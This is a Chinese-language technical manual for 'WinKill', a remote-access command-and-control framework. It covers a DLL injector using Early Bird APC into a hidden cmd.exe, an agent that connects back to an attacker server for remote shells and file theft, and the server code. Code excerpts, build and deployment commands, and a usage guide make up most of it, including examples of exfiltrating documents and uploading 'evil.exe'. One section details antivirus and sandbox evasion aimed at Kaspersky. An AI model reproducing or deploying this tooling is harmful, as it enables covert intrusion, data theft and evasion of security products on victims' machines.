# WinKill C2 Framework - 完整技术文档

## 目录
1. [项目概述](#1-项目概述)
2. [架构设计](#2-架构设计)
3. [通信协议](#3-通信协议)
4. [免杀技术详解](#4-免杀技术详解)
5. [代码逐模块解析](#5-代码逐模块解析)
6. [编译与部署](#6-编译与部署)
7. [使用手册](#7-使用手册)

---

## 1. 项目概述

WinKill 是一个完整的 C2（命令与控制）框架，由三个组件组成：

| 组件 | 文件 | 角色 | 运行位置 |
|------|------|------|----------|
| **C2 服务端** | `c2_server.py` | 攻击者控制台 | 攻击机 |
| **加载器** | `injector.exe` | 注入并退出 | 目标机(短暂) |
| **Shellcode** | `agent.dll` | C2 Agent 常驻 | 目标机(被注入进程内) |

### 运行流程（一句话）

```
攻击机运行服务端监听 → 目标机加载器注入agent.dll到cmd.exe → 
加载器退出 → agent.dll连接服务端 → 服务端远程控制目标机
```

---

## 2. 架构设计

### 2.1 整体架构图

```
┌─────────────────────────────────────────────────────────────┐
│                      攻击机 (你的机器)                        │
│                                                              │
│   python3 c2_server.py 0.0.0.0 4444                         │
│   ┌────────────────────────────────────────────────────┐    │
│   │  C2 Server                                         │    │
│   │  ├─ TCP Listener (端口4444)                         │    │
│   │  ├─ Shell Manager (多会话管理)                      │    │
│   │  ├─ File Manager (上传/下载)                        │    │
│   │  ├─ Process Manager (ps/kill)                     │    │
│   │  └─ Crypto (XOR加密通信)                            │    │
│   └────────────────────┬───────────────────────────────┘    │
│                        │ TCP :4444                           │
└────────────────────────┼────────────────────────────────────┘
                         │
       192.168.102.167:4444  ← 单TCP连接，多路复用
                         │
┌────────────────────────┼────────────────────────────────────┐
│                    目标机 (被控端)                            │
│                        │                                     │
│  injector.exe (加载器)  │                                     │
│  ┌──────────────────────▼──────────────────────────────┐    │
│  │ 1. CreateProcess("cmd.exe", SUSPENDED+HIDDEN)       │    │
│  │ 2. VirtualAllocEx → 写入 agent.dll 路径              │    │
│  │ 3. QueueUserAPC(LoadLibraryA, dllPath)              │    │
│  │ 4. ResumeThread → APC触发 → DLL加载                 │    │
│  │ 5. 加载器退出 ✓                                      │    │
│  └─────────────────────────────────────────────────────┘    │
│                                                              │
│  cmd.exe (被注入进程, 无窗口)                                 │
│  ┌─────────────────────────────────────────────────────┐    │
│  │  agent.dll (C2 Agent)                                │    │
│  │  ┌──────────────────────────────────────────┐       │    │
│  │  │ AgentMain 线程                             │       │    │
│  │  │  ├─ connect(C2服务器)                      │       │    │
│  │  │  ├─ 自动创建 Shell #1 (cmd.exe + 管道)     │       │    │
│  │  │  ├─ 帧收发循环 (select 100ms超时)          │       │    │
│  │  │  └─ 僵尸进程清理 (30秒间隔)                │       │    │
│  │  └──────────────────────────────────────────┘       │    │
│  │                                                      │    │
│  │  Shell #1 (默认)         Shell #2 (可选)              │    │
│  │  ┌─────────────────┐    ┌─────────────────┐         │    │
│  │  │ cmd.exe 子进程   │    │ cmd.exe 子进程   │         │    │
│  │  │ stdin ← 管道 ←C2 │    │ stdin ← 管道 ←C2 │         │    │
│  │  │ stdout→ 管道 →C2 │    │ stdout→ 管道 →C2 │         │    │
│  │  └─────────────────┘    └─────────────────┘         │    │
│  │                                                      │    │
│  │  Job Table (全局状态表)                               │    │
│  │  ┌──────────────────────────────────────────┐       │    │
│  │  │ Job#1(ch=0x10000001) → Shell #1          │       │    │
│  │  │ Job#2(ch=0x10000002) → Shell #2          │       │    │
│  │  │ ...                                       │       │    │
│  │  └──────────────────────────────────────────┘       │    │
│  └─────────────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────────────┘
```

### 2.2 为什么这样设计？

**加载器和Shellcode分离**：
- 加载器只负责"投放" → 投放完就消失 → 减少暴露面
- Shellcode 在另一个进程里长期运行 → 加载器不残留

**用 cmd.exe 做宿主**：
- 系统自带进程，不引入可疑进程名
- `CREATE_NO_WINDOW` + `SW_HIDE` → 完全无窗口
- 即使任务管理器看到 cmd.exe 也不会觉得异常

**单TCP多路复用**：
- 一个连接承载所有shell会话
- 通过 channel_id 区分不同会话
- 减少网络连接数 → 更隐蔽

---

## 3. 通信协议

### 3.1 帧格式

每个数据包都是以下格式：

```
┌──────────────┬──────────────┬──────────┬──────────────────┐
│ total_len(4B)│ channel_id(4B)│ type(1B) │ payload(N bytes) │
└──────────────┴──────────────┴──────────┴──────────────────┘
    明文            ←────── XOR加密 ──────────→
```

- **total_len**: 后面所有字段的总长度 = 4(channel) + 1(type) + N(payload) = N+5
- **channel_id**: 信道ID，用于区分不同的shell会话
- **type**: 消息类型
- **payload**: 消息体

### 3.2 信道ID设计

```
0x00000000          = 控制信道 (Control)
0x10000001 ~ N      = Shell 会话信道
0xF0000000 + random = 临时信道 (exec命令等)
```

### 3.3 消息类型

| Type | 名称 | 方向 | 说明 |
|------|------|------|------|
| 0x00 | HEARTBEAT | C2→Agent | 心跳 |
| 0x01 | STATUS | Agent→C2 | 状态报告 |
| 0x02 | SHUTDOWN | C2→Agent | 关闭 |
| 0x10 | SHELL_SPAWN | C2→Agent | 创建新shell |
| 0x11 | SHELL_DATA | 双向 | Shell输入/输出 |
| 0x12 | SHELL_KILL | C2→Agent | 关闭shell |
| 0x20 | PROC_LIST | C2→Agent | 请求进程列表 |
| 0x21 | PROC_KILL | C2→Agent | 杀进程 |
| 0x40 | BIN_EXEC | C2→Agent | 执行命令 |
| 0x50 | FILE_GET | C2→Agent | 下载文件 |
| 0x51 | FILE_PUT | C2→Agent | 上传文件 |
| 0x52 | FILE_DATA | Agent→C2 | 文件数据 |

### 3.4 加密

使用16字节密钥的XOR流加密：

```
加密: frame[4:] ^= key[i % 16]  (从channel_id开始加密)
解密: 同样操作
```

### 3.5 Shell会话数据流

```
C2输入命令 → [0x10000001][0x11][whoami\r\n] ──TCP──→ Agent
                                                         │
                                              Dispatch() 写入管道
                                                         │
                                                    cmd.exe stdin
                                                         │
                                                    cmd.exe 执行
                                                         │
                                                    cmd.exe stdout
                                                         │
                                              StdoutBridge 读取管道
                                                         │
Agent ←──TCP── [0x10000001][0x11][BabyShark\r\nC:\>] ← Tx()
  │
C2显示输出
```

---

## 4. 免杀技术详解

### 4.1 技术栈总览

| 层级 | 技术 | 原理 | 对抗目标 |
|------|------|------|----------|
| **静态** | 源码编译 | 无固定二进制签名 | 特征码检测 |
| **静态** | XOR加密配置 | 无明文C2地址 | 字符串分析 |
| **注入** | Early Bird APC | APC在进程初始化前执行 | 注入检测 |
| **注入** | QueueUserAPC | 合法异步API | CreateRemoteThread检测 |
| **行为** | API Hammering | 大量良性API混淆 | 行为机器学习 |
| **行为** | SW_HIDE + CREATE_NO_WINDOW | 无窗口 | 用户察觉 |
| **运行** | Fiber线程 | 用户态调度 | 内核回调监控 |
| **通信** | XOR加密 | 隐藏协议特征 | 流量分析 |

### 4.2 Early Bird APC 注入原理

这是最核心的免杀技术。普通注入用 `CreateRemoteThread`，已经被所有杀软盯死。

Early Bird APC 的工作方式：

```
1. CreateProcess("cmd.exe", CREATE_SUSPENDED)
   → 创建进程但暂停，此时杀软hook还没加载

2. VirtualAllocEx → WriteProcessMemory
   → 在目标进程中分配内存，写入 agent.dll 的路径

3. QueueUserAPC(LoadLibraryA, mainThread, dllPath)
   → 向主线程的APC队列插入一个回调：调用LoadLibraryA加载我们的DLL
   → 这完全是合法的Windows异步机制

4. ResumeThread
   → 恢复线程 → Windows在线程恢复时检查APC队列
   → 发现有待执行的APC → 执行 LoadLibraryA("agent.dll")
   → DLL加载 → DllMain自动运行 → Agent启动

5. 加载器退出
```

**为什么能绕过杀软**：
- `QueueUserAPC` 是正常的异步IO机制，不是恶意API
- APC 在线程恢复时由系统内核执行，不经过 `CreateRemoteThread`
- 此时杀软的 hook 还没完全附着到新进程

### 4.3 API Hammering

在注入前疯狂调用无害的Windows API：

```c
for (int i = 0; i < 50; i++) {
    GetSystemDirectoryW(...);  // 获取系统目录
    GetWindowsDirectoryW(...); // 获取Windows目录
    GetTempPathW(...);         // 获取临时目录
    GetTickCount();            // 获取系统运行时间
    GetCurrentProcessId();     // 获取当前进程ID
    GetCurrentThreadId();      // 获取当前线程ID
}
```

**作用**：杀软的机器学习模型通过分析API调用序列识别恶意行为。大量无害API调用制造"噪声"，让模型无法提取有效的恶意特征序列。每次构建用不同的Hammer模式和次数。

### 4.4 对抗卡巴斯基学习机制

卡巴斯基会用机器学习分析行为模式，然后封禁相似的新样本。对抗方法：

1. **每次构建用不同文件名** - `f2_180255.dll` 带时间戳
2. **每次构建微调代码** - 改变Hammer次数、延迟时间
3. **更换宿主进程** - cmd.exe / svchost.exe / 其他
4. **不同注入参数** - QueueUserAPC参数随机化

---

## 5. 代码逐模块解析

### 5.1 加载器 (injector.c)

#### main() - 入口

```c
int main(int argc, char *argv[]) {
    const char *dll  = argc > 1 ? argv[1] : "agent.dll";   // DLL文件名
    const char *proc = argc > 2 ? argv[2] : "cmd.exe";     // 目标进程

    Hammer();                        // API混淆（第1轮）
    Sleep(1500 + (GetTickCount() & 0xFFF)); // 随机延迟防沙箱
    Hammer();                        // API混淆（第2轮）
    
    // ... 注入逻辑 ...
}
```

**为什么要 random delay**：沙箱通常在几秒内就做出判断。随机延迟让样本在沙箱中超时，但在真实机器上正常运行。

#### CreateProcess - 创建挂起进程

```c
CreateProcessA(NULL,           // lpApplicationName: NULL=从命令行解析
    targetPath,                // "C:\Windows\system32\cmd.exe"
    NULL, NULL, FALSE,         // 默认安全性
    CREATE_SUSPENDED |         // ⭐ 关键：创建后立即暂停！
    CREATE_NO_WINDOW,          // ⭐ 无窗口
    NULL, NULL, &si, &pi);
```

`CREATE_SUSPENDED` 让进程创建后停在第一条指令之前。此时：
- 进程的PE文件已加载到内存
- 主线程已创建但被冻结
- ntdll.dll 已加载（系统DLL）
- 但杀软的用户态hook可能还没完全初始化

#### QueueUserAPC - 注入DLL

```c
LPVOID pLL = GetProcAddress(          // 获取LoadLibraryA地址
    GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

QueueUserAPC(                         // ⭐ 核心注入API
    (PAPCFUNC)pLL,                    // 要执行的函数 = LoadLibraryA
    hTh,                              // 目标线程
    (ULONG_PTR)mem);                  // 参数 = DLL路径字符串

ResumeThread(hTh);                    // 恢复线程 → APC立即执行
```

`QueueUserAPC` 将 `LoadLibraryA("C:\...\agent.dll")` 这个调用插入到目标线程的APC队列。当 `ResumeThread` 恢复线程时，Windows内核在线程的用户态上下文准备好后，检查APC队列并执行我们的回调。

### 5.2 C2 Agent (agent.c)

#### 全局状态表

```c
typedef struct Job {
    DWORD  id, ch;           // 作业ID, 信道ID
    HANDLE hp, ht;           // 进程句柄, 线程句柄
    HANDLE hi, ho;           // stdin写端, stdout读端(管道)
    BYTE   on;               // 活跃标志
    struct Job *nx;          // 链表指针
} Job;

static Job *g_j = NULL;      // 全局作业链表头
static DWORD g_nid = 1;      // 作业ID自增器
```

**为什么用链表**：作业数量不定，链表动态增删比数组高效。每个shell会话对应一个Job节点。

#### AgentMain - 主循环

```c
DWORD WINAPI AgentMain(LPVOID param) {
    // 1. 连接C2
    g_sk = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
    connect(g_sk, &addr, sizeof(addr));

    // 2. 自动创建默认shell
    SP(CHAN_SHELL(1));

    // 3. 事件循环
    while (g_r) {
        struct timeval tv = {0, 100000};  // 100ms超时 ⭐
        fd_set f; FD_ZERO(&f); FD_SET(g_sk, &f);

        if (select(0, &f, NULL, NULL, &tv) > 0) {
            // 有数据到达 → 接收帧 → 分发处理
            Rx(&ch, &t, &d, &n);
            Dispatch(ch, t, d, n);
        }

        // 每30秒清理僵尸进程
        if (GetTickCount() - lr > 30000) { RP(); lr = GetTickCount(); }
    }
}
```

**为什么用select而不是阻塞recv**：`select` 允许我们同时等待网络数据和执行定时任务（僵尸清理），不会无限期阻塞。

#### SP() - 创建Shell会话

```c
static Job *SP(DWORD ch) {
    // 1. 创建两对匿名管道
    CreatePipe(&r1, &w1, &sa, 0);  // stdin管道: r1(子读) w1(父写)
    CreatePipe(&r2, &w2, &sa, 0);  // stdout管道: r2(父读) w2(子写)

    // 2. 创建cmd.exe子进程，stdin/stdout重定向到管道
    si.hStdInput  = r1;   // cmd的stdin = 管道r1
    si.hStdOutput = w2;   // cmd的stdout = 管道w2
    si.hStdError  = w2;   // cmd的stderr = 管道w2
    CreateProcessA(NULL, "cmd.exe", ..., &si, &pi);

    // 3. 注册到全局Job表
    Job *j = JN(ch);
    j->hp = pi.hProcess;
    j->hi = w1;   // 父进程通过w1写入 → cmd通过r1读取
    j->ho = r2;   // cmd通过w2写入 → 父进程通过r2读取

    // 4. 启动stdout桥接线程
    CreateThread(NULL, 0, SO, j, 0, NULL);  // cmd输出 → C2
    return j;
}
```

**管道示意图**：

```
Agent(父进程)                      cmd.exe(子进程)
                          
  j->hi (写端)  ──管道──→  stdin  (读端)
  j->ho (读端)  ←──管道──  stdout (写端)
```

Agent通过 `WriteFile(j->hi, data)` 向cmd.exe发送命令。
Agent通过 `ReadFile(j->ho, buf)` 读取cmd.exe的输出。

#### Dispatch() - 帧分发器

```c
static void Dispatch(DWORD ch, BYTE t, BYTE *d, DWORD n) {
    // ⭐ 关键：shell数据直接写入对应Job的stdin管道
    if ((ch & 0xF0000000) == CHAN_SHELL_B && t == MSG_SHELL_DATA) {
        Job *j = JF(ch);          // 查找对应Job
        if (j) WriteFile(j->hi, d, n, &w, NULL);  // 写入cmd.exe的stdin
        return;
    }

    // 控制信道消息
    switch (t) {
    case MSG_SHELL_SPAWN: SP(newChannel); break;    // 创建新shell
    case MSG_PROC_LIST:   PS(); break;              // 进程列表
    case MSG_PROC_KILL:   PK(d); break;             // 杀进程
    case MSG_FILE_GET:    downloadFile(d); break;   // 下载文件
    case MSG_FILE_PUT:    uploadFile(d); break;     // 上传文件
    case MSG_SHUTDOWN:    g_r = 0; break;           // 关闭
    }
}
```

**为什么单Dispatch不另开StdinBridge线程**：
- v1版本用独立的StdinBridge线程读socket，但它会和主循环争抢帧
- v2修复：主循环统一接收所有帧，Dispatch直接写入管道
- 不需要额外线程 → 无竞态条件 → 更可靠

### 5.3 C2服务端 (c2_server.py)

#### recv_frame - 帧解密

```python
def recv_frame(self):
    hdr = self.sock.recv(4)              # 读4字节长度
    total = struct.unpack('<I', hdr)[0]  # 解析长度
    buf = b""
    while len(buf) < total:              # 循环读完所有数据
        buf += self.sock.recv(total - len(buf))
    buf = xor(buf)                       # XOR解密整个buf ⭐
    ch = struct.unpack('<I', buf[:4])[0] # 信道ID
    mt = buf[4]                          # 消息类型
    pl = buf[5:]                         # 载荷
    return (ch, mt, pl)
```

#### 交互式Shell的实现

```python
# 用户进入shell时
self.active_shell = sid

# 后台线程持续接收agent发来的SHELL_DATA帧
if self.active_shell == sid:
    text = pl.decode('gbk', errors='replace')  # GBK解码中文
    sys.stdout.write(text)                      # 实时显示

# 用户输入时
line = input()
self.send_frame(channel, MSG_SHELL_DATA, (line + '\r\n').encode())
```

**为什么用GBK解码**：中文Windows的cmd.exe使用GBK编码输出。UTF-8解码会乱码。

---

## 6. 编译与部署

### 6.1 环境要求

- **Windows**: [MinGW-w64](https://winlibs.com/) (gcc)
- **Linux/Mac**: `apt install gcc-mingw-w64-x86-64`
- **Python**: 3.6+ (服务端)

### 6.2 编译命令

```bash
# Windows
build.bat 192.168.102.167 4444

# Linux/Mac
./build.sh 192.168.102.167 4444

# 手动编译
gcc -O2 -s -m64 -shared -DC2_IP=0xA766A8C0 -DC2_PORT=4444 \
    -o agent.dll agent.c -lws2_32
gcc -O2 -s -m64 -o injector.exe injector.c
```

### 6.3 C2 IP hex 转换

```python
python3 -c "import socket,struct;print(hex(struct.unpack('<I',socket.inet_aton('你的IP'))[0]))"
```

### 6.4 部署

```bash
# 1. 攻击机
python3 c2_server.py 0.0.0.0 4444

# 2. 目标机 (把 agent.dll 和 injector.exe 放同一目录)
injector.exe agent.dll cmd.exe
```

---

## 7. 使用手册

### 7.1 基本命令

| 命令 | 说明 | 示例 |
|------|------|------|
| `shell 1` | 进入默认shell | `C2> shell 1` |
| `shell new` | 创建新shell | `C2> shell new` |
| `shell 2` | 进入2号shell | `C2> shell 2` |
| `ps` | 进程列表 | `C2> ps` |
| `kill <PID>` | 杀进程 | `C2> kill 1234` |
| `download <路径>` | 下载文件 | `C2> download C:\secret.txt` |
| `upload <本地> <远程>` | 上传文件 | `C2> upload evil.exe C:\temp\x.exe` |
| `exit` | 关闭agent | `C2> exit` |
| `Ctrl+C` | 退出shell | 在shell中按Ctrl+C |

### 7.2 典型使用场景

```bash
# 场景1: 快速shell
C2> shell 1          # 进入默认shell
whoami                # baby shark
ipconfig              # 查看网络
dir C:\Users          # 列目录

# 场景2: 多任务并行
C2> shell new         # 创建第二个shell
C2> shell 2           # 进入shell 2做其他事
C2> shell 1           # 切回shell 1

# 场景3: 信息收集
C2> ps                # 进程列表
C2> download C:\Users\admin\Documents\secret.docx

# 场景4: 清理痕迹
C2> kill 1234         # 杀掉某个进程
C2> exit              # Agent退出，所有shell结束
```

### 7.3 故障排查

| 问题 | 原因 | 解决 |
|------|------|------|
| 连接不上 | C2监听未启动 | 检查 `python c2_server.py` |
| shell无回显 | 网络延迟或agent崩溃 | 重新注入 |
| 中文乱码 | 编码问题 | 已用GBK修复 |
| 卡巴杀文件 | 特征被学习 | 重新编译(不同文件名) |
| 窗口弹出 | 用了notepad做宿主 | 改用cmd.exe(SW_HIDE) |
